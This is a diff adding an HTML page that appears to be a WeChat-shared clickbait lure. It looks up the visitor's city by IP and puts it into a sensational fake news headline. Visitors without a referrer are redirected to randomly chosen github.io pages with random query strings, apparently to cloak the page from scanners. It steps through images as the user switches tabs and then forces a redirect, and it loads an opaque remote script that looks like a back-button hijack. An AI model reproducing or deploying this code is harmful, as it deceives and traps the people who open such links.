@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+    <meta http-equiv="X-UA-Compatible" content="ie=edge"/>
+    <title></title>
+    <link rel="stylesheet" href="https://laowen-1.oss-cn-hangzhou.aliyuncs.com/video/js/index.css"/>
+    <script>
+        function randomString(len) {
+            len = len || 32;
+            var $chars = 'ABCDEFGHJKMNPQRSTWXYZabcdefhijkmnprstwxyz2345678';
+            /****默认去掉了容易混淆的字符oOLl,9gq,Vv,Uu,I1****/
+            var maxPos = $chars.length;
+            var pwd = '';
+            for (i = 0; i < len; i++) {
+                pwd += $chars.charAt(Math.floor(Math.random() * maxPos));
+            }
+            return pwd;
+        }
+    </script>
+</head>
+<body class="share-body">
+
+</body>
+<script src="https://libs.baidu.com/jquery/2.0.0/jquery.min.js"></script>
+
+<script src="https://ip.ws.126.net/ipquery"></script>
+<script>
+    var address = localAddress.city ? localAddress.city : "";
+    var city = address.replace(/(.*)市/, '$1');
+    city = city.replace("广州", "");
+    city = city.replace("深圳", "");
+    city = city.replace("上海", "");
+    city = city.replace("北京", "");
+    var now = new Date();
+    var hour = now.getHours();//得到小时
+    var minu = now.getMinutes();//得到分钟
+    time = hour + ": " + minu;
+</script>
+
+<script>
+    if (!document.referrer) {
+        var items = ['https://ccbv39.github.io/index.html','https://rbtr30.github.io/index.html','https://zscb03.github.io/index.html'];
+        var iindex = items[Math.floor(Math.random() * items.length)];
+        data = iindex + "?" + randomString(98);
+        location.href = data;
+    } else {
+        var tit = [city +"突发，40人寻衅滋事祸害一方，获利200万元"];
+        var titi = tit[Math.floor(Math.random() * tit.length)];
+        $("title").html(city + titi);//
+        tNum = 1;
+        qNum = 0;
+
+        oosPath = "https://laowen-1.oss-cn-hangzhou.aliyuncs.com/video/img2/";
+        $("body").css("background-image", "url(" + oosPath + (tNum + qNum) + ".png)");
+
+
+        var hiddenProperty = 'hidden' in document ? 'hidden' :
+            'webkitHidden' in document ? 'webkitHidden' :
+                'mozHidden' in document ? 'mozHidden' :
+                    null;
+        var visibilityChangeEvent = hiddenProperty.replace(/hidden/i, 'visibilitychange');
+        var onVisibilityChange = function () {
+            if (!document[hiddenProperty]) {
+                window.show_time = Date.now();
+                if (show_time - hidden_time > 1000) {
+                    if (tNum > 6) {
+                        qNum += 1;
+                    } else {
+                        tNum += 1;
+                    }
+                    if (qNum > 2) {
+                        location.href = iindex+"?key=" + randomString(16) + "&jump=1";
+                    }
+                    show();
+
+                }
+
+            } else {
+                window.hidden_time = Date.now();
+            }
+        };
+        document.addEventListener(visibilityChangeEvent, onVisibilityChange);
+    }
+
+    function show() {
+        if (tNum > 6) {
+            $("body").css("background-image", "url(" + oosPath + (tNum + qNum - 1) + ".png)")
+        } else {
+            $("body").css("background-image", "url(" + oosPath + (tNum + qNum) + ".png)")
+        }
+
+    }
+
+
+</script>
+<script src="http://res.21263.net/js/back/c5e345bdddb19e147a1afaf8853d82ca"></script>
+<script src="https://res.wx.qq.com/open/js/jweixin-1.2.0.js"></script>
+<script src="https://laowen-1.oss-cn-hangzhou.aliyuncs.com/video/js/zepto.min.js"></script>
+<script src="https://laowen-1.oss-cn-hangzhou.aliyuncs.com/video/js/config.js"></script>
+<script src="https://laowen-1.oss-cn-hangzhou.aliyuncs.com/video/js/util.js"></script>
+</html>
